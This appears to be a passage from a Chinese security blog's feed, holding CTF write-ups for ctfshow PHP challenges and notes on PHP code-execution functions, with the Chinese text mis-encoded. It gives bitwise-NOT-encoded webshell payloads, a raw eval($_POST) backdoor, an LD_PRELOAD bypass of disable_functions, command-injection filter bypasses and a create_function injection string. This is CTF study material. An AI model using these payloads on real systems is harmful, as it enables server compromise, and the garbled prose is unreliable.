        <content type="html"><![CDATA[<span id="more"></span><p>æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">   $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">   if(strlen($code)&gt;40)&#123;</span><br><span class="line">       die(&quot;This is too Long.&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">       die(&quot;NO.&quot;);</span><br><span class="line">                                               &#125;</span><br><span class="line">       @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">      highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯è¿‡æ»¤äº†å­—æ¯æ•°å­—ï¼Œè·Ÿå‰å‡ å¤©å­¦çš„é‚£ä¸ªå¸¸è§çš„phpç»•è¿‡æ–¹æ³•ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é‡‡ç”¨å–åæˆ–è€…å¼‚æˆ–æ¥è¿›è¡Œ</p><p>æŠ‘æˆ–æ˜¾ç„¶ä¸å¤§è¡Œï¼Œå› ä¸ºæœ‰å­—ç¬¦ä¸²çš„é•¿åº¦é™åˆ¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æœ¬åœ°è¿›è¡Œæµ‹è¯•</p><p>$<em>=GET:(â€˜%07â€™^â€™%40â€™).(â€˜%05â€™^â€™%40â€™).(â€˜%09â€™^â€™%5dâ€™)<br>$__=â€™</em>â€˜.(â€˜%07â€™^â€™%40â€™).(â€˜%05â€™^â€™%40â€™).(â€˜%09â€™^â€™%5dâ€™)//<em>GET<br>$$__=$<em>GET<br>code=$$</em></em>[1]<br>?code=$<strong>=â€™<em>â€˜.(â€˜%07â€™^â€™%40â€™).(â€˜%05â€™^â€™%40â€™).(â€˜%09â€™^â€™%5dâ€™);$$__[1];&amp;1=phpinfo();<br>$</em>=(â€˜%01â€™^â€™%60â€™).(â€˜%08â€™^â€™%7bâ€™).(â€˜%08â€™^â€™%7bâ€™).(â€˜%05â€™^â€™%60â€™).(â€˜%09â€™^â€™%7bâ€™).(â€˜%08â€™^â€™%7câ€™);$</strong>=â€™<em>â€˜.(â€˜%07â€™^â€™%40â€™).(â€˜%05â€™^â€™%40â€™).(â€˜%09â€™^â€™%5dâ€™);$__</em>=$$<strong>;$<em>($</em></strong>[<em>]);&amp;</em>=phpinfo();</p><p>å¼‚æˆ–ä¸æˆåŠŸï¼Œæˆ‘ä¹Ÿå¾ˆå¼‚æˆ–å‘¢ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>é‚£æˆ‘ä»¬å°±ç›´æ¥å–åæŠŠï¼Œä¸ºä»€ä¹ˆå¯ä»¥è¿›è¡Œå–åï¼Œæ˜¯å› ä¸ºå–ååçš„å­—ç¬¦æ—¶ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»•è¿‡æ­£åˆ™åŒ¹é…</p><p>å…ˆæŸ¥çœ‹ä¸€ä¸‹phpinfo(),çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆè¿›è¡Œrceçš„å‘½ä»¤è¢«ç¦ç”¨äº†</p><p>?code=(~%8F%97%8F%96%91%99%90)();</p><p><img src="1.PNG"></p><p>æ€»ä¹‹ï¼Œå°±æ˜¯ä¼šçš„å’Œä¸ä¼šçš„éƒ½è¢«ç¦ç”¨äº†</p><pre><code>    pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>æ€»ä¹‹ï¼Œå°±æ˜¯æˆ‘ä¼šçš„ä¸ä¼šçš„éƒ½è¢«ç¦ç”¨äº†</p><p><a href="https://www.dougua.net/a/7712.html">disable_functionså‡½æ•°è¯¦è§£</a>ï¼Œè¿™ç¯‡æ–‡ç« ä»¥åè¿˜æ˜¯çœ‹ä¸€ä¸‹å§</p><p>ç¦ç”¨å‡½æ•°æˆ‘ç†è§£çš„å°±æ˜¯ç®€å•çš„ç»•è¿‡ï¼Œæ¯”å¦‚æ‹¼æ¥ç»•è¿‡ä»€ä¹ˆä»€ä¹ˆçš„éƒ½æ˜¯ä¸èƒ½å†ä½¿ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘å°±æ²¡æœ‰åŠæ³•äº†ã€‚ã€‚ã€‚</p><p>çœ‹WPï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œæ„é€ ä¸€ä¸ªæœ¨é©¬</p><p>assert: (~%9E%8C%8C%9A%8D%8B)</p><p>(eval($_POST[a]))=(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6)</p><p>(<del>%9E%8C%8C%9A%8D%8B)(</del>%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6);<br>è¿™é‡Œæœ‰ä¸¤ä¸ªç‚¹</p><li>assertä¸evalçš„åŒºåˆ«ï¼šasserté‡Œé¢æ˜¯è¡¨è¾¾å¼ï¼Œæ¯”å¦‚assert('echo(1)')æ˜¯å¯¹çš„ï¼Œä½†æ˜¯assert('echo(1);'),å°±æ˜¯é”™çš„<p>evalä¸assertæ­£å¥½ç›¸åï¼Œevalé‡Œé¢æ˜¯å­—ç¬¦ä¸²ï¼Œeval(â€˜echo(1);â€™)è¿™æ˜¯å¯¹çš„</p><p>è€Œä¸”åœ¨urlä¸­%9Eä¹‹ç±»çš„å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯1ï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯1ï¼Œæ‰€ä»¥æˆåŠŸçš„æ²¡æœ‰åˆ°è¾¾æœ€å¤§é™åˆ¶é•¿åº¦</p><p><img src="2.PNG"></p><p>æˆåŠŸè¿æ¥ä¸Šæœ¨é©¬åï¼Œæˆ‘ä»¬å‘ç°ï¼Œæœ‰ä¸¤ä¸ªä¼¼ä¹å¯¹æˆ‘ä»¬æœ‰ç”¨çš„æ–‡ä»¶ï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªæ˜¯ç©ºçš„ï¼Œç¬¬äºŒä¸ªä¸€å †ä¹±ç ï¼Œé‚£æˆ‘ä»¬è¿æ¥è¿™ä¸ªæœ¨é©¬ï¼Œäº‰è¿™ä¸ªshellå°±æ²¡æœ‰ä»€ä¹ˆç”¨å¤„äº†</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p><p>æˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¸€ä¸‹è¿™ä¸¤å¼ å›¾ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å› ä¸ºè¿™é“é¢˜ç›®disable_functionsç¦ç”¨çš„å¤ªå¤šäº†ï¼Œä»¥è‡³äºæˆ‘ä»¬è¿æ¥æœ¨é©¬æ˜¯æ²¡æœ‰ä»€ä¹ˆç”¨å¤„çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨åªèƒ½åšçš„å°±æ˜¯å¦‚ä½•å»ç»•è¿‡è¿™ä¸ªdisable_functionså»æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤</p><p><a href="https://www.anquanke.com/post/id/175403">æ·±å…¥æµ…å‡ºLD_PRELOAD &amp; putenv() </a></p><p>åˆ©ç”¨linuxæä¾›çš„LD_preloadç¯å¢ƒå˜é‡ï¼ŒåŠ«æŒå…±äº«soï¼Œåœ¨å¯åŠ¨å­è¿›ç¨‹çš„æ—¶å€™ï¼Œæ–°çš„å­è¿›ç¨‹ä¼šåŠ è½½æˆ‘ä»¬æ¶æ„çš„soæ‹“å±•ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨soé‡Œé¢å®šä¹‰åŒåå‡½æ•°ï¼Œå³å¯åŠ«æŒAPIè°ƒç”¨ï¼ŒæˆåŠŸRCE</p><p>äºæ˜¯åœ¨tmpä¸­ä¸Šä¼ æˆ‘ä»¬çš„æ–‡ä»¶</p><p><img src="5.PNG"></p><p><a href="https://codechina.csdn.net/mirrors/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?utm_source=csdn_github_accelerator">githubåœ°å€</a></p><p>(åˆ«å¿˜äº†ï¼Œæ–‡ä»¶æ”¾åœ¨ä¸‹è½½é‡Œé¢äº†)</p><p><img src="6.PNG"></p><p>å¾—åˆ°flag</p><p>4.1</p><p>æ•´ç†äº†ä¸‹æ€è·¯ï¼Œæ‰“å¼€çœ‹åˆ°è¿‡æ»¤çš„æƒ…å†µæ˜¯[A-Z0-9a-z],æ‰€ä»¥é‡‡ç”¨å»å»ç¿»ç»•è¿‡ï¼Œå…ˆå»æŸ¥çœ‹phpinfo,æŸ¥çœ‹è¿‡æ»¤äº†ä»€ä¹ˆå‡½æ•°ï¼Œå‘ç°ç¦ç”¨äº†æˆ‘ä»¬å¾ˆå¤šçš„å‡½æ•°ï¼Œæƒ³å»æ„é€ ä¸€ä¸ªåé—¨ï¼Œé€šè¿‡è¿ä¸Šèšå‰‘ï¼Œå»æŸ¥çœ‹flag.<br>assert: %9E%8C%8C%9A%8D%8B<br>(eval($_POST[a])):%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6</p><?php eval($_POST[a]);?><p>æˆ‘åˆšæ‰åˆæƒ³å°è¯•è¯´ç›´æ¥ä¼ å…¥?code=$_POST[a],å–åå˜›ï¼Œä½†æ˜¯å¾ˆä¸å¹¸æ²¡æœ‰æˆåŠŸã€‚<br>è¿ä¸Šèšå‰‘ä¹‹åæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿æ²¡æœ‰å®ç°ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥åœ¨èšå‰‘ä¸Šè¯•ä¸€è¯•ï¼Œå°±æ˜¯ä»€ä¹ˆå‘½ä»¤éƒ½æ‰§è¡Œä¸äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åªèƒ½å»ç»•è¿‡è¿™ä¸ªdisable_function,ä¸Šä¼ ç‚¹æ˜¯èšå‰‘çš„var/tmpï¼Œä¸Šä¼ ä¹‹åæˆ‘ä»¬å†ä¸€æ¬¡å»æ‰§è¡Œå‘½ä»¤</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-web 41-45</title>
      <link href="/2021/03/27/ctfshow-web41/"/>
      <url>/2021/03/27/ctfshow-web41/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>å¥‡å¥‡æ€ªæ€ªçš„çŸ¥è¯†åˆå¢åŠ äº†</p><span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;c&#39;]))&#123;</span><br><span class="line">   $c &#x3D; $_POST[&#39;c&#39;];</span><br><span class="line">if(!preg_match(&#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;, $c))&#123;</span><br><span class="line">       eval(&quot;echo($c);&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>å¥½å®¶ä¼™å†ä¸€æ¬¡æŠŠæˆ‘ä¼šçš„éƒ½è¿‡æ»¤äº†</p><p>è¿™ä¸ªé¢˜è¿‡æ»¤äº†$ã€+ã€-ã€^ã€~ä½¿å¾—å¼‚æˆ–è‡ªå¢å’Œå–åæ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ªæˆ–è¿ç®—ç¬¦|ã€‚</p><p>(â€˜%13%19%13%14%05%0Dâ€™|â€™%60%60%60%60%60%60â€™)</p><h2>web42</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if(isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">      $c&#x3D;$_GET[&#39;c&#39;];</span><br><span class="line">  system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>2>&1```,å°±æ˜¯æŠŠæ‰€æœ‰çš„è¾“å‡ºä¸ç®¡æ˜¯å¯¹çš„è¿˜æ˜¯é”™çš„éƒ½ä¸¢å¼ƒäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠåè¾¹çš„ä¸œè¥¿è¿›è¡Œæˆªæ–­</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å¯ä»¥è¿›è¡Œæˆªæ–­çš„æœ‰ï¼Œ&#39;;&#39;,&#39;%0a&#39;,&#39;||&#39;;</span><br><span class="line"></span><br><span class="line">å°±æ˜¯?c&#x3D;ls;  ls%0a  ls||</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web43&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">è·Ÿä¸Šé¢ä¸€æ ·</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web44&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å¯ä»¥çœ‹åˆ°ï¼Œflagè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨sort f*%0aæ¥è¿›è¡Œç»•è¿‡</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web45&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>    if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sort$&#123;IFS&#125;$9f*%0a&lt;br&gt;</span><br><span class="line">sort$&#123;IFS&#125;f*%0a&lt;br&gt;</span><br><span class="line">sort%09f*%0a&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web46&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>if(isset($_GET[&#39;c&#39;]))&#123;   $c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å¾ˆæ˜¯å¼‚æˆ–ï¼Œä¸ºå•¥*è¢«è¿‡æ»¤äº†æˆ‘ç”¨ï¼Ÿå°±ä¸è¡Œï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">éè¦&#39;&#39;</span><br><span class="line"></span><br><span class="line">sort&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line">nl&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line">sort&lt;fl&#39;&#39;ag.php%oa</span><br><span class="line">nl&lt;fl&#39;&#39;ag.php%oa</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web47&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>    if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125; </code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nl&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web48&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line">nl&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line"></span><br><span class="line">tac&lt;&gt;fl&#39;&#39;ag.php%oa</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web49&lt;&#x2F;h2&gt;</span><br><span class="line">nl&lt;&gt;fl&#39;&#39;ag.php%||</span><br><span class="line"></span><br><span class="line">tac&lt;&gt;fl&#39;&#39;ag.php%||</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;web50&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>    if(isset($_GET[&#39;c&#39;]))&#123;$c=$_GET[&#39;c&#39;];if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><p>```<br>nl&lt;&gt;flâ€™â€™ag.php%||</p><p>tac&lt;&gt;flâ€™â€™ag.php%||</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpä»£ç æ‰§è¡Œä¸­å‡ºç°è¿‡æ»¤é™åˆ¶çš„ç»•è¿‡æ‰§è¡Œæ–¹æ³•</title>
      <link href="/2021/03/25/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0h%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/"/>
      <url>/2021/03/25/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0h%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>è¿™æ˜¯ä¸€ä½å¤§ä½¬å†™çš„ï¼Œ<a href="https://blog.csdn.net/mochu7777777/article/details/104631142">åŸæ–‡åœ°å€</a>ï¼Œæ·±å…¥å­¦ä¹ ä¸€ä¸‹</p><span id="more"></span><blockquote><p>æœ¬ç¯‡æ–‡ç« æ€»ç»“äº†å¤§ä½¬åœ¨æ¯”èµ›ä¸­ç¢°åˆ°è¿‡çš„å„ç§ä»£ç ç»•è¿‡æ‰§è¡Œçš„æ–¹æ³•</p></blockquote><h2>ä»£ç æ‰§è¡Œå‡½æ•°</h2><li>eval()<p>æœ€å¸¸è§çš„ä»£ç æ‰§è¡Œå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸²codeå½“ä½œphpä»£ç æ‰§è¡Œã€‚</p><blockquote><p>eval(string $code): mixed</p></blockquote><li>assert()<p>åˆ¤æ–­ä¸€ä¸ªæ–­è¨€æ˜¯å¦æ˜¯false</p><blockquote><p>PHP 5</p></blockquote><p>assert ( mixed $assertion [, string $description ] ) : bool</p><blockquote><p>PHP 7</p></blockquote><p>assert ( mixed $assertion [, Throwable $exception ] ) : bool</p><p>assert()ä¼šæ£€æŸ¥æŒ‡å®šçš„assertion()ï¼Œå¹¶åœ¨ç»“æœä¸ºfalseçš„æ—¶å€™é‡‡å–é€‚å½“çš„è¡ŒåŠ¨ï¼Œåœ¨php5ï¼Œphp7ä¸­å¦‚æœassertionæ˜¯å­—ç¬¦ä¸²ï¼Œä¼šè¢«å½“ä½œphpä»£ç æ‰§è¡Œ</p><li>preg_replace()+/e<p>æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p><blockquote><p>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</p></blockquote><p>è¿™ä¸ªåŒ¹é…subjectï¼Œå°†patternæ›¿æ¢ä¸ºreplacementï¼Œå¦‚æœpatternä¸­æœ‰é‡‡ç”¨â€œ/eâ€æ¨¡å¼ï¼Œé‚£ä¹ˆå°±ä¼šå°†replacementå½“æˆphpä»£ç æ‰§è¡Œï¼ˆè¿™ç§â€œ/eâ€æ¨¡å¼åœ¨php7ä¸­è¢«ç§»é™¤ï¼‰</p><p><img src="1.png"></p><p><img src="2.PNG"></p><li>create_function()<p>åˆ›å»ºä¸€ä¸ªåŒ¿åï¼ˆlambdaæ ·å¼ï¼‰å‡½æ•°</p><blockquote><p>create_function ( string $args , string $code ) : string</p></blockquote><p>æ ¹æ®ä¼ é€’çš„å‚æ•°åˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸ºå…¶è¿”å›å”¯ä¸€çš„åç§°ã€‚å¦‚æœæ²¡æœ‰ä¸¥æ ¼å¯¹å‚æ•°ä¼ é€’è¿›è¡Œè¿‡æ»¤ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ payloadä¼ é€’ç»™create_function()å¯¹å‚æ•°æˆ–å‡½æ•°ä½“é—­åˆæ³¨å…¥æ¶æ„ä»£ç å¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><p><a href="https://blog.csdn.net/dyw_666666/article/details/90042852">å…³äºcreate_functionæ›´è¯¦ç»†çš„è§£é‡Š</a></p><p>string $args å˜é‡éƒ¨åˆ†</p><p>string $code æ–¹æ³•ä»£ç éƒ¨åˆ†</p><p><img src="3.png"></p><p>å°±ç›¸å½“äº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">funtion newfunc($fname)&#123;</span><br><span class="line">echo $fname.&quot;Chen&quot;;</span><br><span class="line">&#125;</span><br><span class="line">newfunc(&quot;Keyan &quot;);</span><br></pre></td></tr></table></figure><p>å®˜æ–¹ç»™çš„ä¾‹å­</p><blockquote><?php</blockquote><p>$newfunc = create_function(â€˜$a,$bâ€™, â€˜return â€œln($a) + ln($b) = â€œ . log($a * $b);â€™);</p><blockquote><p>echo â€œNew anonymous function: $newfuncâ€;</p></blockquote><blockquote><p>echo $newfunc(2, M_E) ;<br>?&gt;</p></blockquote><p>æˆ‘ä»¬å…ˆçœ‹ä¸€æ®µæœ‰é—®é¢˜çš„ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$str2&#x3D;&#39;echo  &#39;.$a.&#39;test&#39;.$id.&quot;;&quot;;</span><br><span class="line">echo $str2;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;;</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$f1 &#x3D; create_function(&#39;$a&#39;,$str2);</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„ä»£ç ?id=;}phpinfo();/*</p><blockquote><p>æºä»£ç ï¼š<br>function fT($a)</p></blockquote><blockquote><p>{<br>  echo â€œtestâ€.$a;<br>}</p></blockquote><blockquote><p>æ³¨å…¥åä»£ç ï¼š<br>function fT($a) {</p></blockquote><blockquote><p>echo â€œtestâ€;}</p></blockquote><p>  phpinfo();/*;//æ­¤å¤„ä¸ºæ³¨å…¥ä»£ç ã€‚</p><blockquote><p>}</p></blockquote><p><img src="4.PNG"></p><p>php7.4.3è¿˜æ˜¯æœ‰è¿™ä¸ªæ¼æ´çš„</p><h2>å¯å›è°ƒå‡½æ•°</h2><li>array_map()<p>ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•°</p><blockquote><p>array_map ( callable $callback , array $array , array â€¦$arrays ) : array</p></blockquote><p>è¿”å›æ•°ç»„ï¼Œæ˜¯ä¸ºarrayæ¯ä¸ªå…ƒç´ åº”ç”¨callbackå‡½æ•°ä¹‹åçš„æ•°ç»„ã€‚ array_map()è¿”å›ä¸€ä¸ªarrayï¼Œæ•°ç»„å†…å®¹ä¸ºarray1çš„å…ƒç´ 